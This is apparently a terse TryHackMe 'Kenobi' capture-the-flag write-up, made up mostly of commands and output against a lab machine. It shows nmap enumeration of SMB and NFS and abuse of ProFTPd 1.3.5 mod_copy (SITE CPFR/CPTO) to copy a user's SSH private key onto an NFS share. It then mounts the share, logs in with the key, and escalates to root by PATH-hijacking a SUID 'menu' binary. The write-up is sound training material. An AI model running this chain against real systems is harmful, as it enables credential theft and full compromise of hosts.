# TRYHACKME : KENOBI
***NOTE: Write-up is straightforward and doesn't contain lengthy explanation.***

## NMAP
```
nmap -sVC -T5 10.10.68.96
```

ports:
21
22
80
111
139
445
2049
```
Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2025-02-24T14:22:19-06:00
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 12h36m01s, deviation: 3h27m51s, median: 10h36m00s
| smb2-time: 
|   date: 2025-02-24T20:22:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.96
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.68.96\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.96\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.96\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.96
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1837228.0  6876400.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
```

## smbclient 
```
smbclient //10.10.68.96/anonymous
ls
get log.txt
```
```
smbget -R smb://10.10.68.96/anonymous
handle_name_resolve_order: WARNING: Ignoring invalid list value 'smb://10.10.68.96/anonymous' for parameter 'name resolve order'
Downloaded 0b in 0 seconds
```
## ftp 
```
telnet 10.10.68.96 21
```
```
ProFTPd version: 1.3.5
searchsploit: 4 exploits
- ProFTPd 1.3.5 - 'mod_copy' Command  | linux/remote/37262.rb
- ProFTPd 1.3.5 - 'mod_copy' Remote C | linux/remote/36803.py
- ProFTPd 1.3.5 - 'mod_copy' Remote C | linux/remote/49908.py
- ProFTPd 1.3.5 - File Copy 
```
> we will use the mod_copy module or File Copy: use SITE CPFR and SITE CPTO)

## nc
```
nc 10.10.212.188 21 
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
```
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.212.188:/var /mnt/kenobiNFS
sudo ls -la /mnt/kenobiNFS
sudo cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
sudo ssh -i id_rsa kenobi@10.10.15.43
cat user.txt
```

### Privilege Escalation ###
> find suid rws permission
````
find / -perm -u=s -type f 2>/dev/null
/usr/bin/menu
````
```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
1
id
cat /root/root.txt
```
